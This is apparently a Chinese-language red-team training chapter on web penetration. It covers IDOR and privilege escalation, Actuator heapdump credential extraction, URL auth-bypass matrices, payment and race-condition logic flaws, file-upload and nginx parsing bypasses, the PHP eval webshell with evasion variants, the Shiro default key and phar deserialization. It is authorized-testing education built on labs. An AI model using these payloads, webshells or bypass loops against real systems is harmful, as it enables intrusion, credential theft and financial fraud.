# VOL-02 Web 应用渗透（下）：越权、逻辑漏洞与利用构造

> 受众：5 年源码审计/产品安全、刚转岗一人红队的工程师。上册（见 VOL-02-Web-上）解决"进得去"，本册解决"进得深、拿得稳"：越权与逻辑漏洞是审计经验迁移率最高的板块——黑盒选手测不出支付状态机跳跃，你却看得懂业务语义。末节收口为 POC→EXP 与 finding 卡。

> 交叉引用：本系列卷号以最终目录为准，本文以 VOL-01-信息收集、VOL-02-Web-上、VOL-05-客户端分析、VOL-06-内网、VOL-08-报告交付 指代对应主题卷。

## 目录
- 1. 越权与访问控制
  - 1.1 水平越权（IDOR）：从对象标识枚举到批量验证
  - 1.2 垂直越权：低权限凭证打高权限接口
  - 1.3 未授权访问：Actuator、Swagger、管理后台与内存马视角
  - 1.4 URL 鉴权绕过：中间件与路由层的规范化差异
- 2. 逻辑漏洞
  - 2.1 支付与订单状态机
  - 2.2 验证码与密码找回
  - 2.3 短信轰炸（接口滥用）
  - 2.4 竞态条件与单包攻击
- 3. 文件上传
  - 3.1 黑白名单绕过全谱
  - 3.2 解析漏洞：nginx + php-fpm
  - 3.3 条件竞争上传
  - 3.4 Webshell 一句话原理与免杀基础
- 4. 反序列化
  - 4.1 Java：Fastjson 与 Shiro（指纹、原理、无害验证）
  - 4.2 PHP：magic 方法与 phar
- 5. POC→EXP 构造方法论与漏洞卡片规范

## 1. 越权与访问控制

失效的访问控制（Broken Access Control）居 OWASP Top 10 2021 首位（A01），对一人红队产出最高：不需要新漏洞类型，只要"两把账号+对照实验"。

### 1.1 水平越权（IDOR）：从对象标识枚举到批量验证

**【原理】** 不安全的直接对象引用（IDOR, Insecure Direct Object Reference）：服务端拿用户输入的对象 ID 只做查询、不做归属校验——`SELECT * FROM orders WHERE id=?` 少了 `AND user_id=?`。黑盒判据是响应差异：换 ID 后 200 且数据字段换人即实锤。

**【操作】** Burp 全流程逐步：
1. 登录 A 账号，Proxy 开启，走完核心业务（查订单/资料/附件下载），把带 ID 的请求全部 Send to Repeater。
2. 标注对象标识：`userId=1001`、`orderId=ORD2024-0007`、`/api/v2/invoices/88f3`。区分可枚举 ID（数字/短串）与 UUIDv4——后者改打"响应里泄露他人 ID"的引用接口。
3. 注册同角色 B 账号，产生 B 的订单/资料，记下 B 的标识值。
4. 重放 A 会话请求，只把 ID 换成 B 的值（一次只换一个变量），Send。
5. 批量验证：请求送 Intruder，选中 ID，Payload type=Numbers(1000–1200)；Payloads→Payload processing→Add prefix `ORD2024-` 适配带前缀编号；Options→Grep-Match 添加 `phone|email|balance`；Attack type=Sniper，开跑。
6. 双标识请求（userId+orderId 双校验）用 Pitchfork 挂两个 payload 集。懒人路线：BApp Store 装 Autorize，把 B 的 Cookie 填入后开自动重放，标黄（200/302）的请求即疑似越权，人工复核。

**【验证】** 预期输出：Intruder 结果表里非本人 ID 的行状态 200 且 Grep 列命中 B 的手机号/姓名；Repeater 里改 `userId` 后响应 JSON 的 `name` 从 A 变成 B。留证三联：请求、响应、A/B 身份说明，证明你确实看到了他人数据。

**【陷阱】** ①UUID≠安全，他人 UUID 出现在响应/引用接口里同样成立；②只换 ID 不换认证头——把两个 Cookie 一起换，测出的是会话问题不是 IDOR；③写操作 IDOR（改/删/转账）比读更严重，但必须用 B 的自有资源验证并立即还原；④400/403 不等于没洞，可能校验了错误的对象（校验了 role 没校验 tenant）。

### 1.2 垂直越权：低权限凭证打高权限接口

**【原理】** 垂直越权（Privilege Escalation）分两层：接口层（低权限 token 调高权限 API）与数据层（请求体注入角色字段）。前端隐藏菜单只是 UI 裁剪，后端路由不校验角色才是根因——即你审计常见的角色判断漏写在某个 Controller 外。

**【操作】** 1) 准备 admin/普通账号各一；2) 以 admin 走完后台，Site map 里圈出全部管理接口；3) Proxy→Options→Match and Replace 把 Cookie/Authorization 换成普通用户的（或直接把普通用户 token 粘进 Repeater 重放管理接口）；4) 玩角色字段：`{"role":"user"}` 改 `"admin"`、`isAdmin=false` 改 true、参数污染 `role=user&role=admin`；5) 管理接口抓不全时挖 JS：Engagement Tools→Find references 提取 admin 路径字典逐个试。

**【验证】** 普通用户凭证调 `/api/admin/users/delete` 返回 200 且目标状态变化；或同一请求 403→200。注意区分"路由存在"（404 变 401/403）与"鉴权生效"。

**【陷阱】** ①admin 面板常在独立子域（见 VOL-01-信息收集），主站测不到不代表没有；②删除类接口先建测试数据，删他人数据即事故；③垂直越权常与 1.1 叠加：普通用户 token 进 admin 接口再换 userId，一步读全库。

### 1.3 未授权访问：Actuator、Swagger、管理后台与内存马视角

**【原理】** 未授权访问（Unauthenticated Access）不是单一漏洞，是鉴权层缺失的统称。高频四类：①Spring Boot Actuator（执行器）：`management.endpoints.web.exposure.include` 配置过宽暴露 `/actuator/*`——`env` 泄配置口令，`heapdump` 泄内存（活跃 session、token、明文凭据），jolokia/gateway 端点可走向 RCE；②Swagger/OpenAPI 文档暴露=白送一份"鉴权审计清单"；③管理后台弱口令/默认口令/只改了前端入口；④内存马（Memory Shell）视角：未授权 RCE 落地后可注入 Controller/Filter 内存马，不落盘、重启即失；评估未授权端点要按"攻击者获得免鉴权高价值能力"定级，而非"只是个监控页"。

**【操作】**
```bash
# 端点探测（字典自备：actuator/swagger/常见后台路径）
ffuf -w actuator.txt -u https://target/FUZZ -mc 200,301,302,401 -ac
# 重点路径：/actuator /actuator/env /actuator/heapdump /actuator/health
#          /swagger-ui.html /swagger-ui/index.html /v2/api-docs /v3/api-docs /doc.html
curl -s https://target/actuator/env | jq '._embedded.env'        # 搜 password/secret/jdbc
curl -s -o heap.hprof https://target/actuator/heapdump
strings heap.hprof | grep -aiE 'password|secret|jdbc:|token' | sort -u
```
堆文件大时用 Eclipse MAT（eclipse.dev/mat）查对象（OQL 以 MAT 官方文档为准）；swagger 的 OpenAPI JSON 把全部 path 导入 Burp Site map，用未登录态逐个重放。

**【验证】** `/actuator/env` 返回 JSON 且含真实配置值；heapdump 能 grep 出 jdbc 连接串/密钥；`/v3/api-docs` 返回 OpenAPI 结构。管理后台则记录"可未授权访问的功能清单"，不是"页面打得开"。

**【陷阱】** ①actuator 常在独立端口（8081/9090）不对外，碰到它靠 VOL-01-信息收集 的端口测绘与 SSRF 链；②heapdump 里的活跃 session 可直接劫持登录态用户，使用前确认授权范围；③swagger 版本路径差异大（springfox v2/springdoc v3/knife4j），别只探一个；④把未授权 RCE 按信息泄露报——定级错误是客诉重灾区（口径见 VOL-08-报告交付）。

### 1.4 URL 鉴权绕过：中间件与路由层的规范化差异

**【原理】** 一次请求过三层：反向代理（nginx）→中间件（Tomcat/Netty）→框架层（Spring Security/Shiro/自研过滤器）。各层对"何时解码 %XX、是否折叠 //、是否吃掉 ; 后参数、是否解析 .."的理解不一致即生绕过。例：Tomcat 把分号当路径参数分隔符（`/admin;x` 映射为 `/admin`），旧版 Shiro 却用原始 URI 做链匹配——`/xxx/..;/admin/page` 被 Shiro 判为公开前缀放行、被 Spring 路由到 /admin/page 执行，即 CVE-2020-1957。`%2e`、双重编码 `%252e` 同理：第一层不解码透传、第二层解码成 `../`，两层规范化结果不一致（与 §3.2 同构）。

**【操作】** 对每个 401/403 路径跑变形矩阵：
```bash
for p in '/admin' '/admin/' '/admin/.' '/admin/..;/' '/;/admin' '/%2e/admin' \
         '/%2e%2e/admin' '/%252e%252e/admin' '//admin' '/ADMIN' '/admin.json' \
         '/admin%20' '/xxx/../admin'; do
  code=$(curl -s -o /dev/null -w '%{http_code}' --path-as-is "https://target$p")
  echo "$code  $p"
done
```
重点看 403/401→200 的跳变行。nginx 场景另查 alias 未加尾斜杠（`location /static { alias /app/static/; }` 请求 `/static../` 可穿越）与 merge_slashes 行为（以 nginx.org 官方文档为准）。

**【验证】** 变形 URI 返回 200 且响应体是管理页/接口数据（比对 Content-Type 与长度；自定义 error 页也可能是 200）。有源码审读能力的你，直接对照框架 URI 规范化源码（如 Shiro PathMatchingFilterChainResolver）构造 payload 更准。

**【陷阱】** ①浏览器与多数 HTTP 库会自动规范化 `../` 与 `%2e`，curl 必须加 `--path-as-is`；Burp 要编辑 raw 请求并留意 Inspector 的自动处理（以 Burp 官方文档为准）；②跳到 200 也可能是后端 404 页（自定义错误页状态 200），要比对响应长度；③先读后写，写接口绕过要有回滚预案。

**【练习】**（第 1 节）：①PortSwigger Web Security Academy「Access control vulnerabilities」模块的 IDOR/垂直越权系列免费 lab（portswigger.net/web-security/access-control）；②vulhub `shiro/CVE-2020-1957` 认证绕过环境（github.com/vulhub/vulhub，路径以官方目录为准）；③自建 Spring Boot 暴露 actuator 全端点，20 分钟内完成 heapdump 凭据提取。

## 2. 逻辑漏洞

逻辑漏洞（Business Logic Vulnerability）没有通用扫描器，正适合你：读懂业务语义即读懂代码。

### 2.1 支付与订单状态机

**【原理】** 交易一致性靠两个不变量：金额数量服务端算、订单状态服务端状态机驱动。漏洞=不变量被客户端输入破坏：金额被信任（改包）、状态机跳跃（未支付→已发货）、并发窗口（券重复核销）。

**【操作】** 1) 全程抓包下单到回调，整条请求链存 Engagement；2) 改金额：创建订单 `price=9900`→`1`、`0.01`、负数 `-1`（负金额+退款=提现）、浮点 `0.001`；3) 改数量：`quantity=-1` 总价为负；4) 回调重放：保存支付 callback 原样重放、改 `orderStatus=PAID`、逐个删签名字段（没验签就中）；5) 状态跳跃：直接调"确认收货/退款"跳过支付；6) 优惠券：同一 couponId 并发下 50 单（衔接 2.4）。

**【验证】** 支付侧真实扣 0.01 而订单标记 9900 已支付=实锤；或未支付订单直接触发发货成功。验证要闭环到业务侧状态变化（订单页/后台可见），不能只看返回码。

**【陷阱】** ①真实支付=真实资金，用 1 分钱测试商品，测完立即退款并留凭据；②别漏货币/积分/券三种计量混用的接口；③回调重放前看时间戳/nonce，有校验就同步改值再放。

### 2.2 验证码与密码找回

**【原理】** 找回链条：账号→身份证明（验证码/Token）→新密码。任何一步的证明材料可猜、可复用、可跨账号、可跳过，即洞。验证码四弱点：用后不失效、无次数限制可爆破、响应包回显、仅前端校验。

**【操作】** 1) 走完整找回流程抓包，找 step 类参数：`step=2` 直接改 `step=3` 跳步；2) 验证码爆破：Repeater 重放 4–6 位纯数字 code（无限速时），或 Intruder Numbers；3) 目标参数置换：A 的找回流程里把 `username=A` 改 `username=admin`（验证码沿用）；4) Token 体检：链接 token 是否时间戳+MD5、短数字或响应包直接返回；5) 响应包搜 `code`/`captcha` 回显；6) 改密请求原样重放验 Token 单次性。

**【验证】** 授权测试账号收到重置邮件并能登录；Token 可预测则写脚本预测下一个并验证成功。三截图：改包请求、收件邮件、登录成功。

**【陷阱】** ①只测授权测试账号，对真实用户账号做找回=侵权；②验证码爆破遇 5 次锁定即停，改测锁定后能否换接口继续爆破；③短信验证码与图形验证码是两套体系，分开测。

### 2.3 短信轰炸（接口滥用）

**【原理】** 短信轰炸（SMS Bombing）是资损型接口滥用：风控只看单手机号频次或完全无频控。绕过维度：伪造 X-Forwarded-For（仅当服务端信任该头）、参数污染（`phone=a&phone=a`）、数组多值（`{"phone":["a","a"]}`）、号码变体（+86/空格/086）、多入口叠加（注册/找回/邀请/解绑各自无频控，N 个入口放大 N 倍）。

**【操作】** Repeater 先手工发两次确认无频控；再 Intruder：payload=同一手机号×50，观察每次响应均 `200 "已发送"`；逐项叠加变体头/参数变形；对照计时确认"1 分钟 N 条"。

**【验证】** 自有测试手机 1 分钟收到多条同源短信，超过官网承诺上限即成立；记录运营商、时间窗、条数。

**【陷阱】** ①只打自有号码，打他人号码即使 2 条也违规；②取证到 10 条级别即停；③报告要给资损测算（条数×单价×可重复天数），这决定甲方修不修（见 VOL-08-报告交付）。

### 2.4 竞态条件与单包攻击

**【原理】** 竞态条件（Race Condition）：服务端"检查→扣减→落库"非原子，并发窗口内多个请求同时通过检查。经典标的：余额、库存、优惠券、抽奖次数、关注上限。传统多线程发包受 TCP 与调度抖动限制，难挤进毫秒窗口；HTTP/2 单包攻击（single-packet attack，James Kettle《Smashing the State Machine》）把 N 个请求塞进一个包同时到达，命中率高一个量级。

**【操作】** 1) 定位"检查后使用"接口（领券/抽奖/提现/转账）；2) Burp 2023+ Repeater 分组：同一请求复制 20 份建组，组右键选 single-packet attack 发包（HTTP/2 站点；功能入口以 Burp 官方文档为准）；3) 复杂场景用 Turbo Intruder（BApp Store）内置 race 模板（examples 内含 race-single-packetattack.py，以插件内置列表为准）；4) 发包后查余额/券数是否大于应得。

**【验证】** 一组并发后账户多出 N 张券或余额重复入账；证据必须含"发包前余额、发包后余额"两帧。若甲方提供日志，可见同一校验并发通过 N 次。

**【陷阱】** ①单包攻击要求目标支持 HTTP/2，否则退回 last-byte 同步或多连接并发；②窗口极小时响应可能全 200 却只落库 1 条——竞态验副作用不验响应码；③先看限流，必要时申请测试白名单，别把客户风控打挂。

**【练习】**（第 2 节）：①PortSwigger「Business logic vulnerabilities」与「Race conditions」模块（含 single-packet attack 官方 lab：portswigger.net/web-security/race-conditions）；②精读 portswigger.net/research/smashing-the-state-machine；③HTB Editorial（Easy，Linux）——图书发布流程的接口逻辑缺陷暴露内部 API 与凭据，完整走"逻辑漏洞→凭据→立足"链（以 hackthebox.com/machines/editorial 及公开 writeup 为准）。

## 3. 文件上传

### 3.1 黑白名单绕过全谱

**【原理】** 上传校验五层：前端 JS、后缀黑白名单、Content-Type、文件头（魔术字节 magic bytes）、内容解析（getimagesize/二次渲染）。绕过=找"校验层"与"使用层"（容器怎么解析它）的不一致：后端只看扩展名而容器按其他规则执行（3.2）；后端看 Content-Type 而磁盘文件名不受影响。

**【操作】** 变形谱系（黑名单）：
```text
shell.php  → shell.php5 / shell.phtml / shell.pht （哪个生效取决于容器解析配置）
           → shell.php.（Windows 尾点）/ shell.php空格 / shell.php::$DATA（NTFS 流）
           → 大小写 shell.pHp / 双写绕替换型过滤 shell.pphpp
白名单    → .htaccess（Apache+mod_php）: AddType application/x-httpd-php .jpg
           → .user.ini（PHP-CGI/FPM）: auto_prepend_file=shell.gif
Content-Type → Burp 改 multipart 的 Content-Type: image/jpeg
魔术字节  → 文件头拼 GIF89a（骗 exif/getimagesize 最低成本）
```
步骤：1) 先传正常 jpg 确认回显路径规则；2) 单变量降级试探（.php→.php5→GIF89a+.php5），每次只改一个维度，定位卡在哪层；3) Burp 里 `filename` 与 Content-Type 分别改。

**【验证】** 拿到完整 URL 后验证解析：向一句话 POST `cmd=phpinfo();`，返回 phpinfo 输出即代码执行。找不到路径先解决路径发现（响应 JSON/前端回显/目录爆破，见 VOL-01-信息收集）。

**【陷阱】** ①能上传≠能执行：nginx 把上传目录全当静态文件时转向 3.2/3.3 或换目录（头像与附件目录解析权限常不同）；②二次渲染会洗掉文件尾 payload，绕法在未被重采样的格式数据段（如 PNG 的 PLTE/IDAT），成本高，先找别的口；③测试载荷用 `phpinfo();`/`echo md5(1);`，不放攻击功能。

### 3.2 解析漏洞：nginx + php-fpm

**【原理】** nginx 不执行 PHP，把 URI 以 `.php` 结尾的请求 fastcgi 转发给 php-fpm。经典解析漏洞：`location ~ \.php$` 匹配 URI 末尾，`/uploads/1.jpg/1.php` 末尾恰是 .php 命中转发；PHP 侧 `cgi.fix_pathinfo=1` 向上回溯把真实文件定位为 `/uploads/1.jpg`、`/1.php` 作 PATH_INFO——图片被当 PHP 解析。本质与 §1.4 同构：匹配层（nginx 正则）与执行层（PHP pathinfo 回溯）对路径理解不一致。

**【操作】** 1) 传含一句话的 1.jpg（GIF89a 头+PHP 尾）；2) 访问 `http://t/uploads/1.jpg/1.php` 并 POST `cmd=phpinfo();`；3) 不行再试 `/1.jpg/a.php`、`/1.jpg%00.php`（旧版）；4) 黑盒只能试探，拿到配置则直接看 `security.limit_extensions` 与 `cgi.fix_pathinfo`——审计转岗的你一眼能判。

**【验证】** 返回 phpinfo 即实锤；404/Access denied 则不受影响，记录关闭。vulhub 对应环境为 `nginx/nginx_parsing_vulnerability`（以官方目录为准）。

**【陷阱】** ①现代 php-fpm 默认 `security.limit_extensions=.php`，只放行真 .php 后缀——旧资料在新环境大量失效，别照抄结论；②此漏洞要求"可控上传点+该目录可被转发给 fastcgi"，纯静态站先走 3.1 判断；③异常 `.php` URI 会进日志，测完同步甲方。

### 3.3 条件竞争上传

**【原理】** 服务端流程"先存盘→再校验→不合格即删"，存盘到删除之间是毫秒窗口。并发持续访问上传路径，赶在删除前把请求送进解析器即执行；变体：窗口期触发"重命名/包含"逻辑固化文件（.htaccess 落地同理）。

**【操作】** 双终端并发：
```bash
# 终端1：不停上传（Burp Intruder Null payload + 20 线程亦可）
while :; do curl -s -F 'file=@race.php' http://t/upload.php; done
# 终端2：不停访问
while :; do curl -s -d 'cmd=echo md5(1);' http://t/uploads/race.php; done
```
命中即输出 `c4ca4238a0b923820dcc509a6f75849b`（md5(1)），把命中的请求/响应完整存证。

**【验证】** 终端 2 出现一次 md5 值即证明窗口存在；连续跑 3 组统计命中率写进报告（稳定性是定级依据）。

**【陷阱】** ①文件名每次一致才易命中（按原名落盘）；服务端强制重命名（加时间戳）就转向路径发现或放弃；②别在业务高峰跑死循环，命中即停；③上传内容保持无害。

### 3.4 Webshell 一句话原理与免杀基础

**【原理】** 一句话木马（one-liner webshell）`<?php @eval($_POST['cmd']); ?>` 的本质：把 HTTP 参数接到动态执行原语（eval）上，流量与功能分离——功能代码由客户端（蚁剑/冰蝎）按需下发。免杀（Evasion）分三类：①执行原语替换（回调 `array_map($_GET['f'],[$_GET['c']])`、可变函数 `$f($_GET['c'])` 等）；②流量特征变形（参数名、Base64/gzinflate/异或、载荷挪到 Cookie/Header）；③落点变形（auto_prepend_file、phar、内存马不落盘）。理解"特征在哪一层被匹配"比背 payload 重要。

**【操作】** 1) 本地搭 PHP+nginx（见 3.2），放原生一句话，用蚁剑（github.com/AntSwordProject/AntSword）连一次并抓包——看清客户端下发什么，才知道免杀改哪里；2) 依次替换为回调式/可变函数式，观察哪版被本机杀软或 WAF 拦下；3) 结合 3.3 理解"访问即触发"型后门。

**【验证】** 蚁剑列目录成功；抓包确认无明文 `eval`/`assert` 字样，即达基础免杀。

**【陷阱】** ①仅授权合同明确允许时落地 Webshell，交付时列清单并协助清除；②PHP 8 移除 assert 字符串执行与 preg_replace /e，旧 payload 直接报错；③内存马属持久化行为，客户环境慎用（衔接 VOL-06-内网）。

**【练习】**（第 3 节）：①upload-labs（github.com/c0ny1/upload-labs，覆盖黑白名单/条件竞争/.htaccess/二次渲染 21 关，关卡号以仓库 README 为准）按 3.1 单变量降级法全通；②vulhub `nginx/nginx_parsing_vulnerability` 复现 3.2；③自建环境跑通 3.3 并录屏。

## 4. 反序列化

不安全的反序列化（Insecure Deserialization）你源码审计最熟，黑盒要补的是"指纹识别"与"无害验证"。

### 4.1 Java：Fastjson 与 Shiro

**【原理】** Fastjson 的 `@type` 允许 JSON 实例化任意类并调 setter——设计即危险，靠 autotype 名单封堵。历史脉络：1.2.24 时代直接可用 JdbcRowSetImpl 走 JNDI 加载远程类；1.2.47 利用缓存机制在 autotype 关闭时仍可绕过；其后 expectClass 校验与 safeMode 逐步收口（版本细节以 fastjson 官方公告为准）。Shiro 的 rememberMe 则是"序列化→AES 加密→Base64 进 Cookie"：1.2.4 时代默认密钥公开（kPH+bIxk5D2deZiIxcaaaA==，以历史版本源码为准），持密钥即可伪造任意序列化对象（Shiro-550/CVE-2016-4437）；密钥轮换后仍有 CBC 填充预言（Shiro-721/CVE-2019-12422，需一个合法 rememberMe 做前缀）。两条链最终都指向 Commons-Collections 等 Gadget，与你审计过的 sink 同类。本卷只讲识别与无害验证，不构造武器化利用链。

**【操作】** 指纹：1) Fastjson——向 JSON 接口发畸形体（`{"a":`）看报错是否含 `com.alibaba.fastjson`；2) Shiro——`curl -si https://t/login | grep -i rememberMe`，出现 `Set-Cookie: rememberMe=deleteMe` 即 Shiro。无害验证：Fastjson 用报错差异+自建 dnslog 的外连解析记录验证解析能力（仅对授权目标）；Shiro 用默认密钥加密无害对象后观察响应是否不再返回 deleteMe（判定密钥正确性；判定逻辑以 Apache Shiro 源码 AbstractRememberMeManager 为准）。不搭建利用链、不下发执行载荷；利用类动作在书面授权内由 EXP 阶段评估。

**【验证】** Fastjson：报错页含组件类名或 dnslog 收到记录；Shiro：伪造 rememberMe 后响应无 deleteMe。两者都只证明"组件与密钥面存在"，报告标注"可达性已验证、利用链未执行"。

**【陷阱】** ①Gadget 依赖目标 classpath（Commons-Collections 版本决定链），黑盒先探版本（/version 端点、错误页、favicon hash，见 VOL-01-信息收集）；②JNDI 外连要在授权窗口并报备出口白名单；③探测 payload 易触发 WAF/甲警报情；④1.2.68+ 开 safeMode 后 @type 全禁，别硬打。

### 4.2 PHP：magic 方法与 phar

**【原理】** PHP 入口是 `unserialize()`，利用面是魔术方法（Magic Methods）：`__destruct`/`__wakeup` 反序列化时自动调用（链起点），`__toString`/`__call`/`__get` 被后续代码触发（链传导）。POP 链（Property-Oriented Programming）=可控输入→wakeup/destruct→一串调用到 sink（eval/include/file_put_contents），与 Java Gadget 同构。经典 `__wakeup` 绕过 CVE-2016-7124（PHP<5.6.25/7.0.10）：序列化串属性个数大于真实值即跳过 wakeup。phar:// 是第二入口：phar 文件 metadata 在流操作（如 `file_exists('phar://x.phar/a')`）时自动反序列化，把"文件名可控"升级为反序列化入口；phar.readonly 只限制生成不限制触发。

**【操作】** 1) 黑盒找输入：Cookie/参数出现 `O:4:"User":` 形态（Base64 常见，解码确认）；2) 手工构造：本地写同名类，`php -r 'echo serialize($o);'` 生成 payload，改属性个数绕 wakeup（`O:4:"Test":2:{...}` 实际 1 属性）；3) phar 链：确认目标有接收用户路径的文件函数后，`php -d phar.readonly=0 build.php` 生成含 metadata 的 phar，改后缀（.gif/.jpg 均可，头在文件内部）上传，再把参数指向 `phar://uploads/x.gif/a`。

**【验证】** payload 类的 `__destruct` 写标记文件 `file_put_contents('/tmp/pwned','1')`，目标机出现该文件即链通。对外报告用无害标记，不执行命令。

**【陷阱】** ①phar 要求目标后续把参数用于文件系统函数，"能上传"≠"能触发"；②PHP 8 魔术方法语义有变，payload 按目标版本在本地同版本 PHP 先验再发；③序列化串含引号/空字节，HTTP 传输必须 urlencode——新手最常见的死因。

**【练习】**（第 4 节）：①vulhub `fastjson/1.2.24-rce`、`fastjson/1.2.47-rce`、`shiro/CVE-2016-4437`（目录以 github.com/vulhub/vulhub 为准），只做"指纹+无害验证"两步并写卡；②本地写含 `__wakeup` 的类完成 CVE-2016-7124 绕过实验；③对比 1.2.24 与 1.2.47 环境差异写 200 字笔记。

## 5. POC→EXP 构造方法论与漏洞卡片规范

### 5.1 从验证到稳定利用的工程化

**【原理】** POC（Proof of Concept）回答"洞存不存在"，EXP（Exploit）回答"给定任意同类目标能否稳定打"。工程化差距在四点：环境指纹显式化（版本/配置前提写清）、输入规范化（payload 适配编码/大小写/路径差异）、失败回退、可重复性。一人红队的 EXP 还要可批量：一个项目几百个同框架资产，EXP 即专用扫描器。

**【操作】** 固定工序：1) 指纹前置：EXP 第一步先验组件/版本（如 Shiro deleteMe+密钥探测），不匹配立即退出并输出未命中原因；2) 参数化：目标 URL、payload 落点、回调地址全走 CLI 参数，禁止硬编码；3) 证据自采：成功时自动保存请求/响应到 `./evidence/<host>/`；4) 失败分类退出码：网络不通/指纹不匹配/验证失败，批量才能统计真阴性；5) 默认无害：只做延时/dnslog/标记文件，执行类动作需 `--confirm` 显式开启；6) 沉淀：EXP 入模板库，并补一份 nuclei 检测规则（只验不打口径见 VOL-08-报告交付）。

**【验证】** 自测三连：同命令连跑 3 次结果一致；换机器/出口 IP 仍成功；对已修复镜像跑返回"指纹不匹配"而非误报成功。

**【陷阱】** ①写死的回调域名会留在报告里变成交付事故，全部参数化；②只测过单版本的 EXP 必须标注适用范围；③执行类 EXP 留审计日志，客户复盘时你要能还原每次操作。

### 5.2 漏洞卡片规范（finding 卡）

**【原理】** finding 卡是报告的最小交付单元：让没见过该系统的人 15 分钟内复现、判定、修复；字段齐全的卡是一人红队的交接文档与复测锚点。

**【操作】** 一洞一卡，字段固定（与平台 finding 卡对应）：

| 字段 | 说明/示例 |
|---|---|
| 标题 | 对象+动作+效果：「订单接口越权读取他人收货地址」 |
| 资产 | 入口 URL/参数，关联 VOL-01 资产 ID |
| 类型/CWE | IDOR→CWE-639；未授权→CWE-306；反序列化→CWE-502 |
| 等级 | CVSS 3.1 向量+分值（定级口径见 VOL-08-报告交付） |
| 前置条件 | 是否需登录/低权限账号；版本约束 |
| 复现步骤 | 编号步骤，含完整请求（Burp 原样保存，敏感字段脱敏） |
| POC | 最小验证载荷 |
| EXP | 脚本路径/命令，含无害模式开关 |
| 影响面 | 可越权数据范围（全量/同租户）、资损测算 |
| 证据 | 请求/响应/业务侧截图，命名"资产-漏洞-序号" |
| 修复建议 | 代码级改法：`WHERE id=? AND user_id=?`、状态机服务端化、密钥轮换 |
| 参考 | 官方公告/组件 advisory 链接 |

**【验证】** 卡片质量自检=同事盲测：只给卡不给口头说明，15 分钟复现成功且定级一致。

**【陷阱】** ①步骤写"用 Burp 改包"这种半截话，必须到字段与值；②截图含真实用户数据=二次泄露，脱敏后入库；③POC 与 EXP 混写在同一步，复现者会直接跳到利用；④修复建议写"加强鉴权"等于没写——给可执行改法，这是你源码审计背景最能拉开差距的地方。

**【练习】**（第 5 节）：从第 4 节练习挑 3 个环境，各产出一张合规 finding 卡+一个参数化 EXP（默认无害模式），请同事盲测后按 VOL-08-报告交付 的骨架组装一页样例报告。
